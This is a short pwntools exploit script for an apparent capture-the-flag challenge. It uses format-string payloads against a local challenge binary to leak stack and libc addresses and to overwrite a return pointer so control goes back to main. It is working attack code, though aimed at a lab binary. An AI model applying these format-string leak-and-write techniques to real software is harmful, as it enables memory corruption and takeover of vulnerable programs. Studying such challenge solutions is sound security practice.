#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()
#gdb.attach(p,gdbscript='''
#           b*main
#           brva 0x00000000000014A9
#           brva 0x000000000000152A
#           brva 0x000000000000141E
#           brva 0x000000000000159C
#           ''')
input()
p.sendlineafter(b'flag)\n',b'%p%p%p%p' + b'%')
leak_stack = int(p.recvuntil(b'r')[:-1],16)
log.info(f"leak stack {hex(leak_stack)}")

ret_to_main_ptr = leak_stack + 0x90
dup_ptr = leak_stack + 0x124

payload = f"%{42}c%10$hhn%{216}c%11$hhn".encode()
payload = payload.ljust(0x20,b'a')
payload += p64(ret_to_main_ptr) + p64(dup_ptr)

p.sendline(payload)
### quay lai main va ghi de ptr_fd bang stderr ###
payload2 =  f"%116c%10$hhn|%25$p_\x00".encode().ljust(0x20, b'\x00') + p64(ret_to_main_ptr)
#### leak libc and ret main ####
sleep(2)
p.send(payload2)

libc_leak = p.recvuntil(b'_')
libc_leak = int(libc_leak.split(b'|')[1][:-1],16)

libc_base = libc_leak - 0x2a1ca

log.info(f"{libc_base = :#x}")

p.interactive()
